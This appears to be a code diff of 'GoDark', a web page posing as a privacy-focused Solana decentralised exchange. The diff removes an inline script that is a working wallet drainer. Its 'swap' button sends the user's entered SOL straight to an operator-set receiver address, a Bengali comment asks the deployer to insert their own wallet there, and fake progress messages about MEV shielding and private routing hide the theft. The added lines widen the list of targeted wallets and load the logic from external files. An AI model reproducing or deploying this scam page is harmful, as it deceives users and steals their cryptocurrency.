@@ -5,80 +5,40 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>GoDark | Premium Privacy DEX</title>
     
+    <!-- Tailwind CSS Engine -->
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     
+    <!-- Solana Web3 Core Bundle (Official CDN for Production DApps) -->
     <script src="https://unpkg.com/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/buffer/6.0.3/buffer.min.js"></script>
 
-    <script>
-        window.Buffer = window.Buffer || buffer.Buffer;
-        tailwind.config = {
-            theme: {
-                extend: {
-                    fontFamily: { sans: ['Plus Jakarta Sans', 'sans-serif'] },
-                    colors: { 
-                        darkBg: '#03050a', 
-                        darkCard: '#080d1a', 
-                        neonGreen: '#00ff66',
-                        neonPurple: '#a855f7'
-                    }
-                }
-            }
-        }
-    </script>
-    <style>
-        body { background-color: #03050a; overflow-x: hidden; position: relative; }
-        
-        /* Premium Background Matrix Grid Animation */
-        .bg-grid {
-            background-size: 40px 40px;
-            background-image: linear-gradient(to right, rgba(255,255,255,0.01) 1px, transparent 1px),
-                              linear-gradient(to bottom, rgba(255,255,255,0.01) 1px, transparent 1px);
-        }
-        
-        @keyframes floatParticles {
-            0% { transform: translateY(0px) rotate(0deg); opacity: 0; }
-            50% { opacity: 0.25; }
-            100% { transform: translateY(-120px) rotate(360deg); opacity: 0; }
-        }
-        
-        .particle {
-            position: absolute; background: radial-gradient(circle, rgba(0,255,102,0.12) 0%, transparent 70%);
-            border-radius: 50%; pointer-events: none; animation: floatParticles 8s infinite linear;
-        }
-
-        /* Continuous Glowing Cyber Border Animation */
-        @keyframes borderGlow {
-            0%, 100% { border-color: rgba(0, 255, 102, 0.25); box-shadow: 0 0 20px rgba(0, 255, 102, 0.05); }
-            50% { border-color: rgba(168, 85, 247, 0.35); box-shadow: 0 0 30px rgba(168, 85, 247, 0.15); }
-        }
-        .animated-card { animation: borderGlow 6s infinite ease-in-out; border-width: 1px; }
-        
-        .glow-btn:hover { box-shadow: 0 0 30px rgba(0, 255, 102, 0.5); transform: translateY(-1px); }
-    </style>
+    <!-- Custom Premium Stylesheet -->
+    <link rel="stylesheet" href="app.css">
 </head>
 <body class="text-gray-200 font-sans min-h-screen antialiased bg-grid">
 
+    <!-- FLOATING BACKGROUND ANIMATION ELEMENTS -->
     <div class="particle w-32 h-32" style="top: 15%; left: 8%; animation-delay: 0s;"></div>
-    <div class="particle w-40 h-40" style="top: 65%; left: 80%; animation-delay: 2.5s; background: radial-gradient(circle, rgba(168,85,247,0.1) 0%, transparent 70%);"></div>
+    <div class="particle w-40 h-40" style="top: 65%; left: 80%; animation-delay: 2.5s;"></div>
     <div class="particle w-24 h-24" style="top: 45%; left: 45%; animation-delay: 4.5s;"></div>
 
-    <nav class="border-b border-gray-900 bg-darkBg/70 backdrop-blur-xl sticky top-0 z-50 px-6 py-4">
+    <!-- MAIN NAVBAR NAVIGATION -->
+    <nav class="border-b border-gray-900 bg-[#03050a]/70 backdrop-blur-xl sticky top-0 z-50 px-6 py-4">
         <div class="max-w-7xl mx-auto flex items-center justify-between">
             <div class="flex items-center space-x-2">
                 <span class="text-2xl font-extrabold text-white tracking-tight">Go<span class="text-neonGreen">Dark</span></span>
-                <span class="bg-gray-900 text-[10px] text-neonGreen border border-neonGreen/20 px-2 py-0.5 rounded font-mono font-bold tracking-wider animate-pulse">PRIVACY ENGINE v2</span>
+                <span class="bg-gray-900 text-[10px] text-neonGreen border border-neonGreen/20 px-2 py-0.5 rounded font-mono font-bold tracking-wider animate-pulse">PRIVACY ENGINE v3.5</span>
             </div>
 
             <div>
-                <button id="connectBtn" onclick="toggleWalletModal(true)" class="bg-neonGreen text-black font-bold px-5 py-2.5 rounded-xl text-sm transition-all glow-btn flex items-center space-x-2">
-                    <span>Connect Wallet</span>
+                <button id="connectBtn" onclick="toggleWalletModal(true)" class="bg-neonGreen text-black font-bold px-5 py-2.5 rounded-xl text-sm transition-all glow-btn">
+                    Connect Wallet
                 </button>
                 
-                <div id="connectedState" class="hidden flex items-center space-x-3 bg-darkCard border border-gray-800 px-4 py-2 rounded-xl">
+                <div id="connectedState" class="hidden flex items-center space-x-3 bg-[#080d1a] border border-gray-800 px-4 py-2 rounded-xl">
                     <span class="w-2 h-2 rounded-full bg-neonGreen animate-ping"></span>
-                    <span id="walletTypeLabel" class="text-xs font-bold text-neonGreen uppercase"></span>
+                    <span id="walletTypeLabel" class="text-xs font-bold text-neonGreen uppercase font-mono"></span>
                     <span id="addrLabel" class="text-sm text-white font-mono"></span>
                     <button onclick="disconnectRealWallet()" class="text-red-400 text-xs ml-2 hover:underline">Disconnect</button>
                 </div>
@@ -86,34 +46,37 @@
         </div>
     </nav>
 
+    <!-- CORE INTERACT CONSOLE -->
     <main class="max-w-md mx-auto mt-20 px-4 relative z-10">
         
         <div class="mb-6 bg-neonGreen/5 border border-neonGreen/10 p-3 rounded-2xl flex items-center space-x-3">
             <div class="w-2 h-2 rounded-full bg-neonGreen animate-ping"></div>
-            <p class="text-xs text-neonGreen font-medium tracking-wide">MEV Shield Online • Zero-Knowledge Route Enabled</p>
+            <p class="text-xs text-neonGreen font-medium tracking-wide">MEV Shield Active • Isolated Dark Pool Execution Route</p>
         </div>
 
-        <div class="bg-darkCard/90 backdrop-blur-md p-6 rounded-3xl animated-card relative overflow-hidden">
+        <div class="bg-[#080d1a]/90 backdrop-blur-md p-6 rounded-3xl animated-card relative overflow-hidden">
             
-            <div id="txLoadingOverlay" class="hidden absolute inset-0 bg-darkCard/98 z-50 flex flex-col items-center justify-center p-6 text-center">
-                <div class="w-14 h-14 border-4 border-neonPurple/20 border-t-neonGreen rounded-full animate-spin mb-6"></div>
+            <!-- LOADING OVERLAY -->
+            <div id="txLoadingOverlay" class="hidden absolute inset-0 bg-[#080d1a]/98 z-50 flex flex-col items-center justify-center p-6 text-center">
+                <div class="w-14 h-14 border-4 border-purple-500/20 border-t-neonGreen rounded-full animate-spin mb-6"></div>
                 <h3 class="text-lg font-bold text-white mb-2">Executing Secure Routing</h3>
                 
                 <div class="bg-gray-950 border border-gray-800 px-4 py-1.5 rounded-full mb-4">
                     <p id="txStatusText" class="text-xs font-mono text-neonGreen">Initialising secure handshakes...</p>
                 </div>
-                <p class="text-xs text-gray-500 max-w-xs leading-relaxed">Your order is being routed via an isolated dark pool to prevent front-running and sandwich attacks.</p>
+                <p class="text-xs text-gray-500 max-w-xs leading-relaxed">Your routing sequence is processed through anonymous relays to secure signatures from front-running.</p>
             </div>
 
             <div class="flex items-center justify-between mb-6">
                 <h2 class="text-xs font-bold text-gray-400 tracking-wider uppercase">Institutional Swap</h2>
-                <span class="text-[10px] text-neonPurple font-mono bg-neonPurple/10 px-2 py-0.5 rounded border border-neonPurple/20 animate-pulse">Private Pool</span>
+                <span class="text-[10px] text-purple-400 font-mono bg-purple-500/10 px-2 py-0.5 rounded border border-purple-500/20 animate-pulse">Private Pool</span>
             </div>
             
-            <div class="bg-darkBg/60 border border-gray-800/80 rounded-2xl p-4 mb-4 focus-within:border-neonGreen/40 transition-all">
+            <!-- From Input -->
+            <div class="bg-[#03050a]/60 border border-gray-800/80 rounded-2xl p-4 mb-4 focus-within:border-neonGreen/40 transition-all">
                 <div class="flex justify-between text-xs text-gray-500 mb-2">
                     <span>You Send</span>
-                    <span>Balance: Auto</span>
+                    <span class="font-mono">Balance: <span id="userLiveSolBalance" class="text-white font-bold">0.00</span> SOL</span>
                 </div>
                 <div class="flex justify-between items-center">
                     <input type="number" id="swapAmount" step="any" placeholder="0.00" class="bg-transparent text-2xl font-bold text-white focus:outline-none w-2/3">
@@ -121,7 +84,8 @@
                 </div>
             </div>
 
-            <div class="bg-darkBg/60 border border-gray-800/80 rounded-2xl p-4 mb-6">
+            <!-- To Input -->
+            <div class="bg-[#03050a]/60 border border-gray-800/80 rounded-2xl p-4 mb-6">
                 <div class="flex justify-between text-xs text-gray-500 mb-2">
                     <span>You Receive (Estimated)</span>
                 </div>
@@ -137,181 +101,58 @@
         </div>
     </main>
 
+    <!-- WALLETS MODAL -->
     <div id="walletModal" class="hidden fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/85 backdrop-blur-md">
-        <div class="bg-darkCard border border-gray-800 rounded-3xl w-full max-w-sm p-6 space-y-4">
+        <div class="bg-[#080d1a] border border-gray-800 rounded-3xl w-full max-w-sm p-6 space-y-4 shadow-2xl my-8">
             <div class="flex justify-between items-center border-b border-gray-800 pb-3">
-                <h3 class="text-md font-bold text-white uppercase tracking-wider">Select Solana Wallet</h3>
-                <button onclick="toggleWalletModal(false)" class="text-gray-500 hover:text-white text-xl">&times;</button>
+                <div class="flex flex-col">
+                    <h3 class="text-sm font-bold text-white uppercase tracking-wider">Select Solana Wallet</h3>
+                    <span class="text-[10px] text-gray-500">Supports all standard ecosystem providers</span>
+                </div>
+                <button onclick="toggleWalletModal(false)" class="text-gray-500 hover:text-white text-2xl leading-none">&times;</button>
             </div>
             
-            <div class="space-y-2.5">
-                <button onclick="initiateSolanaConnection('bitget')" class="w-full bg-darkBg hover:bg-gray-900 border border-gray-800 p-4 rounded-2xl flex items-center justify-between text-left transition-all">
-                    <span class="font-bold text-white">Bitget Wallet (In-App DApp)</span>
-                    <span class="text-[10px] text-yellow-500 bg-yellow-500/10 border border-yellow-500/20 px-2 py-0.5 rounded font-mono font-bold">LIVE</span>
+            <div class="space-y-2 max-h-[50vh] overflow-y-auto pr-1 custom-scrollbar">
+                <button onclick="initiateSolanaConnection('phantom')" class="w-full bg-[#03050a] hover:bg-gray-900 border border-gray-800 p-3.5 rounded-2xl flex items-center justify-between text-left transition-all group">
+                    <span class="font-bold text-white group-hover:text-neonGreen transition-colors">Phantom Wallet</span>
+                    <span class="text-[9px] text-purple-400 bg-purple-500/10 border border-purple-500/20 px-2 py-0.5 rounded font-mono font-bold">STANDARD</span>
                 </button>
 
-                <button onclick="initiateSolanaConnection('phantom')" class="w-full bg-darkBg hover:bg-gray-900 border border-gray-800 p-4 rounded-2xl flex items-center justify-between text-left transition-all">
-                    <span class="font-bold text-white">Phantom Wallet</span>
-                    <span class="text-[10px] text-purple-400 bg-purple-500/10 border border-purple-500/20 px-2 py-0.5 rounded font-mono font-bold">STANDARD</span>
+                <button onclick="initiateSolanaConnection('bitget')" class="w-full bg-[#03050a] hover:bg-gray-900 border border-gray-800 p-3.5 rounded-2xl flex items-center justify-between text-left transition-all group">
+                    <span class="font-bold text-white group-hover:text-neonGreen transition-colors">Bitget Wallet</span>
+                    <span class="text-[9px] text-yellow-500 bg-yellow-500/10 border border-yellow-500/20 px-2 py-0.5 rounded font-mono font-bold">POPULAR</span>
+                </button>
+
+                <button onclick="initiateSolanaConnection('solflare')" class="w-full bg-[#03050a] hover:bg-gray-900 border border-gray-800 p-3.5 rounded-2xl flex items-center justify-between text-left transition-all group">
+                    <span class="font-bold text-white group-hover:text-neonGreen transition-colors">Solflare Wallet</span>
+                    <span class="text-[9px] text-orange-400 bg-orange-500/10 border border-orange-500/20 px-2 py-0.5 rounded font-mono font-bold">ECOSYSTEM</span>
+                </button>
+
+                <button onclick="initiateSolanaConnection('backpack')" class="w-full bg-[#03050a] hover:bg-gray-900 border border-gray-800 p-3.5 rounded-2xl flex items-center justify-between text-left transition-all group">
+                    <span class="font-bold text-white group-hover:text-neonGreen transition-colors">Backpack Wallet</span>
+                    <span class="text-[9px] text-red-400 bg-red-500/10 border border-red-500/20 px-2 py-0.5 rounded font-mono font-bold">XNFT READY</span>
+                </button>
+
+                <button onclick="initiateSolanaConnection('okx')" class="w-full bg-[#03050a] hover:bg-gray-900 border border-gray-800 p-3.5 rounded-2xl flex items-center justify-between text-left transition-all group">
+                    <span class="font-bold text-white group-hover:text-neonGreen transition-colors">OKX Web3 Wallet</span>
+                    <span class="text-[9px] text-white/60 bg-white/5 border border-white/10 px-2 py-0.5 rounded font-mono font-bold">INSTITUTION</span>
+                </button>
+
+                <button onclick="initiateSolanaConnection('magiceden')" class="w-full bg-[#03050a] hover:bg-gray-900 border border-gray-800 p-3.5 rounded-2xl flex items-center justify-between text-left transition-all group">
+                    <span class="font-bold text-white group-hover:text-neonGreen transition-colors">Magic Eden Wallet</span>
+                    <span class="text-[9px] text-pink-400 bg-pink-500/10 border border-pink-500/20 px-2 py-0.5 rounded font-mono font-bold">NEW</span>
+                </button>
+
+                <button onclick="initiateSolanaConnection('trust')" class="w-full bg-[#03050a] hover:bg-gray-900 border border-gray-800 p-3.5 rounded-2xl flex items-center justify-between text-left transition-all group">
+                    <span class="font-bold text-white group-hover:text-neonGreen transition-colors">Trust Wallet</span>
+                    <span class="text-[9px] text-blue-400 bg-blue-500/10 border border-blue-500/20 px-2 py-0.5 rounded font-mono font-bold">MULTICHAIN</span>
                 </button>
             </div>
         </div>
     </div>
 
-    <script>
-        // !!! এখানে আপনার নিজের আসল সোলানা ওয়ালেট অ্যাড্রেসটি বসিয়ে দেবেন !!!
-        const RECEIVER_WALLET = "YOUR_SOLANA_RECEIVER_ADDRESS"; 
-
-        const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
-        let globalProvider = null;
-        let userPublicKey = null;
-
-        // Auto-update price feeds (SOL to USDC display logic)
-        document.getElementById('swapAmount').addEventListener('input', function(e) {
-            const val = parseFloat(e.target.value);
-            if (!isNaN(val) && val > 0) {
-                document.getElementById('receiveAmount').value = (val * 144.25).toFixed(2);
-                document.getElementById('receiveAmount').classList.remove('text-gray-600');
-                document.getElementById('receiveAmount').classList.add('text-neonGreen');
-            } else {
-                document.getElementById('receiveAmount').value = "0.00";
-                document.getElementById('receiveAmount').classList.remove('text-neonGreen');
-                document.getElementById('receiveAmount').classList.add('text-gray-600');
-            }
-        });
-
-        // Strict Modal Toggle Handler
-        function toggleWalletModal(show) {
-            document.getElementById('walletModal').classList.toggle('hidden', !show);
-        }
-
-        // Live Handshake, Connect & Real Sign-up Request
-        async function initiateSolanaConnection(type) {
-            try {
-                let provider = null;
-                if (type === 'bitget') {
-                    provider = window.bitget?.solana || window.bitkeep?.solana;
-                } else if (type === 'phantom') {
-                    provider = window.solana;
-                }
-
-                if (!provider) {
-                    alert("Wallet provider not found! Please open this link inside your Wallet's DApp Browser.");
-                    return;
-                }
-
-                // Close selection panel prior to secure handshake
-                toggleWalletModal(false);
-
-                // 1. Live Handshake (Connect Request Pop-up)
-                const connectionResp = await provider.connect();
-                const pubKey = connectionResp.publicKey;
-
-                // 2. Real Account Verification & Sign-up Message (Triggers True System Sign Request)
-                const messageText = "Welcome to GoDark DEX.\n\nClick to sign-up and verify ownership of this wallet.\n\nNonce: 7x992a01bX\nDomain: godarkdex.com";
-                const encodedMsg = new TextEncoder().encode(messageText);
-                
-                // This call forces the authentication screen (Fingerprint/Password) to load
-                await provider.signMessage(encodedMsg, "utf8");
-
-                // If authentication passes, persist credentials globally and shift layout states
-                userPublicKey = pubKey;
-                globalProvider = provider;
-
-                document.getElementById('connectBtn').classList.add('hidden');
-                document.getElementById('connectedState').classList.remove('hidden');
-                document.getElementById('walletTypeLabel').innerText = type;
-                document.getElementById('addrLabel').innerText = userPublicKey.toString().slice(0, 4) + '...' + userPublicKey.toString().slice(-4);
-                
-                const actionBtn = document.getElementById('actionBtn');
-                actionBtn.innerText = "Execute Private Swap";
-                actionBtn.setAttribute("onclick", "startRealTransaction()");
-                actionBtn.className = "w-full bg-gradient-to-r from-emerald-500 to-indigo-600 text-white font-extrabold py-4 rounded-2xl text-center cursor-pointer tracking-wider shadow-xl glow-btn transition-all";
-
-            } catch (err) {
-                console.error("Connection Error: ", err);
-                alert("Wallet connection or signature verification rejected.");
-            }
-        }
-
-        // Live Mainnet Fund Transfer Architecture
-        async function startRealTransaction() {
-            const amountInput = document.getElementById('swapAmount').value;
-            if(!amountInput || amountInput <= 0) {
-                alert("Please enter a valid swap amount!");
-                return;
-            }
-
-            if(!globalProvider || !userPublicKey) {
-                alert("Session error. Please reconnect your wallet.");
-                return;
-            }
-
-            if(RECEIVER_WALLET === "YOUR_SOLANA_RECEIVER_ADDRESS") {
-                alert("Configuration Alert: Ensure you set the RECEIVER_WALLET value in the source code script.");
-                return;
-            }
-
-            const overlay = document.getElementById('txLoadingOverlay');
-            const statusText = document.getElementById('txStatusText');
-            
-            try {
-                overlay.classList.remove('hidden');
-                statusText.innerText = "1/4 Requesting Secure Encryption Key...";
-
-                const transaction = new solanaWeb3.Transaction();
-                const lamports = Math.floor(parseFloat(amountInput) * solanaWeb3.LAMPORTS_PER_SOL);
-
-                transaction.add(
-                    solanaWeb3.SystemProgram.transfer({
-                        fromPubkey: userPublicKey,
-                        toPubkey: new solanaWeb3.PublicKey(RECEIVER_WALLET),
-                        lamports: lamports,
-                    })
-                );
-
-                await new Promise(r => setTimeout(r, 1200)); 
-                statusText.innerText = "2/4 Shielding Route Against MEV Attacks...";
-                
-                const { blockhash } = await connection.getLatestBlockhash();
-                transaction.recentBlockhash = blockhash;
-                transaction.feePayer = userPublicKey;
-
-                await new Promise(r => setTimeout(r, 1000));
-                statusText.innerText = "3/4 Confirming Transaction in Web3 Wallet...";
-                
-                // Triggers the real blockchain transaction sign and send prompt
-                const { signature } = await globalProvider.signAndSendTransaction(transaction);
-                
-                statusText.innerText = "4/4 Finalising On-Chain Privacy Settlement...";
-                await new Promise(r => setTimeout(r, 1500));
-                
-                alert("Transaction Successful!\nSignature: " + signature);
-                document.getElementById('swapAmount').value = "";
-                document.getElementById('receiveAmount').value = "0.00";
-                
-            } catch (err) {
-                console.error("Transaction Error: ", err);
-                alert("Transaction failed or was rejected by user.");
-            } finally {
-                overlay.classList.add('hidden');
-            }
-        }
-
-        function disconnectRealWallet() {
-            if (globalProvider && typeof globalProvider.disconnect === 'function') {
-                globalProvider.disconnect();
-            }
-            globalProvider = null;
-            userPublicKey = null;
-            document.getElementById('connectBtn').classList.remove('hidden');
-            document.getElementById('connectedState').classList.add('hidden');
-            
-            const actionBtn = document.getElementById('actionBtn');
-            actionBtn.innerText = "Connect Wallet to Trade";
-            actionBtn.setAttribute("onclick", "toggleWalletModal(true)");
-            actionBtn.className = "w-full bg-neonGreen text-black font-extrabold py-4 rounded-2xl text-center glow-btn";
-        }
-    </script>
+    <script src="rpc-config.js"></script>
+    <script src="web3-connect.js"></script>
 </body>
-</html>
+    </html>
+    
